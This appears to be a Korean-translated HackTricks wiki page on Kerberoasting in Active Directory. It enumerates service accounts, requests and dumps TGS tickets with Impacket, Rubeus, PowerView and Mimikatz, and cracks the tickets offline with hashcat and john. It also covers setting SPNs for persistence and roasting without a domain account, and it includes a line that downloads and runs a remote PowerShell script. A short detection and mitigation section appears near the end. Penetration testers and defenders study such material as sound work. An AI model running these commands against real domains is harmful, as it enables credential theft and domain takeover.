# Kerberoast

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast)를 사용하여 세계에서 **가장 진보된** 커뮤니티 도구로 구동되는 **워크플로우**를 쉽게 구축하고 **자동화**하세요.\
지금 액세스하세요:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입하거나** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}

## Kerberoast

Kerberoasting은 **Active Directory (AD)**에서 **사용자 계정**으로 운영되는 서비스와 관련된 **TGS 티켓**의 획득에 중점을 둡니다. 이 티켓의 암호화는 **사용자 비밀번호**에서 유래한 키를 사용하여 이루어지며, 이는 **오프라인 자격 증명 크래킹**의 가능성을 허용합니다. 서비스로서 사용자 계정을 사용하는 것은 비어 있지 않은 **"ServicePrincipalName"** 속성으로 표시됩니다.

**Kerberoasting**을 실행하기 위해서는 **TGS 티켓**을 요청할 수 있는 도메인 계정이 필수적이지만, 이 과정은 **특별한 권한**을 요구하지 않으므로 **유효한 도메인 자격 증명**을 가진 누구나 접근할 수 있습니다.

### 주요 사항:

* **Kerberoasting**은 **AD** 내의 **사용자 계정 서비스**에 대한 **TGS 티켓**을 목표로 합니다.
* **사용자 비밀번호**에서 유래한 키로 암호화된 티켓은 **오프라인에서 크랙**될 수 있습니다.
* 서비스는 null이 아닌 **ServicePrincipalName**으로 식별됩니다.
* **특별한 권한**이 필요하지 않으며, 단지 **유효한 도메인 자격 증명**만 필요합니다.

### **공격**

{% hint style="warning" %}
**Kerberoasting 도구**는 공격을 수행하고 TGS-REQ 요청을 시작할 때 일반적으로 **`RC4 암호화`**를 요청합니다. 이는 **RC4가** [**더 약하고**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) Hashcat과 같은 도구를 사용하여 오프라인에서 크랙하기 더 쉽기 때문입니다.\
RC4 (유형 23) 해시는 **`$krb5tgs$23$*`**로 시작하며, AES-256(유형 18)은 **`$krb5tgs$18$*`**로 시작합니다.`
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
다양한 기능을 갖춘 도구로 kerberoastable 사용자 덤프 포함:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Kerberoastable 사용자 열거**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **기법 1: TGS 요청 및 메모리에서 덤프하기**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **기법 2: 자동 도구**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
TGS가 요청될 때, Windows 이벤트 `4769 - Kerberos 서비스 티켓이 요청되었습니다`가 생성됩니다.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast)를 사용하여 세계에서 **가장 진보된** 커뮤니티 도구로 **워크플로우**를 쉽게 구축하고 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### 크래킹
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistence

사용자에 대해 **충분한 권한**이 있다면 **kerberoastable**하게 만들 수 있습니다:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** 이는 로컬 시간 때문이며, 호스트를 DC와 동기화해야 합니다. 몇 가지 옵션이 있습니다:

* `ntpdate <IP of DC>` - Ubuntu 16.04부터 사용 중단
* `rdate -n <IP of DC>`

### Mitigation

Kerberoasting은 exploitable할 경우 높은 수준의 은밀함으로 수행될 수 있습니다. 이 활동을 감지하기 위해서는 **Security Event ID 4769**에 주의를 기울여야 하며, 이는 Kerberos 티켓이 요청되었음을 나타냅니다. 그러나 이 이벤트의 빈도가 높기 때문에 의심스러운 활동을 분리하기 위해 특정 필터를 적용해야 합니다:

* 서비스 이름은 **krbtgt**가 아니어야 하며, 이는 정상 요청입니다.
* **$**로 끝나는 서비스 이름은 서비스에 사용되는 머신 계정을 포함하지 않도록 제외해야 합니다.
* 머신에서 오는 요청은 **machine@domain** 형식의 계정 이름을 제외하여 필터링해야 합니다.
* 성공적인 티켓 요청만 고려해야 하며, 실패 코드 **'0x0'**로 식별됩니다.
* **가장 중요하게**, 티켓 암호화 유형은 Kerberoasting 공격에 자주 사용되는 **0x17**이어야 합니다.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Kerberoasting의 위험을 완화하기 위해:

* **서비스 계정 비밀번호가 추측하기 어렵도록** 하며, **25자 이상**의 길이를 권장합니다.
* **관리형 서비스 계정**을 활용하여 **자동 비밀번호 변경** 및 **위임된 서비스 주체 이름(SPN) 관리**와 같은 이점을 제공하여 이러한 공격에 대한 보안을 강화합니다.

이러한 조치를 구현함으로써 조직은 Kerberoasting과 관련된 위험을 상당히 줄일 수 있습니다.

## 도메인 계정 없이 Kerberoast

**2022년 9월**, Charlie Clark라는 연구자가 자신의 플랫폼 [exploit.ph](https://exploit.ph/)를 통해 시스템을 악용하는 새로운 방법을 공개했습니다. 이 방법은 **KRB_AS_REQ** 요청을 통해 **서비스 티켓(ST)**를 획득할 수 있게 해주며, 놀랍게도 어떤 Active Directory 계정에 대한 제어도 필요하지 않습니다. 본질적으로, 주체가 사전 인증을 요구하지 않도록 설정된 경우—사이버 보안 영역에서 **AS-REP Roasting 공격**으로 알려진 시나리오와 유사한 경우—이 특성을 활용하여 요청 프로세스를 조작할 수 있습니다. 구체적으로, 요청 본문 내의 **sname** 속성을 변경함으로써 시스템이 표준 암호화된 티켓 부여 티켓(TGT) 대신 **ST**를 발급하도록 속일 수 있습니다.

이 기술은 이 기사에서 완전히 설명되어 있습니다: [Semperis 블로그 게시물](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
이 기술을 사용하여 LDAP를 쿼리할 유효한 계정이 없기 때문에 사용자 목록을 제공해야 합니다.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## References

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast)를 사용하여 세계에서 **가장 진보된** 커뮤니티 도구로 구동되는 **워크플로우**를 쉽게 구축하고 **자동화**하세요.\
오늘 바로 접근하세요:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
